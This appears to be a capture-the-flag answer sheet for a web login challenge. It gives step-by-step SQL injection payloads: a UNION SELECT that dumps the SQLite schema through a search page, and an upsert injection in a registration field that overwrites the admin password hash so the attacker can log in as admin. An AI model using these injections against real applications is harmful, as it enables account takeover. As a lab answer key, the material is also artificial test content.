## Login #7 Answer
Sources: https://www.sqlite.org/lang_upsert.html 
        https://tools.keycdn.com/sha256-online-generator

### Instructions:
1. Get structure of database in the search page at `/search`
```
y" UNION SELECT sql, tbl_name FROM sqlite_schema -- 
```
2. Change the password of admin by typing the following command in the Name field of `/register` and anything else in `username` (as long as it is not one already taken) and `password`
```
Owen Mariani", "admin", "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8") ON CONFLICT(userid) DO UPDATE SET password_hash="5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8" -- 
```
3. Login with `admin` and `password` as the username and password on  `/` respectively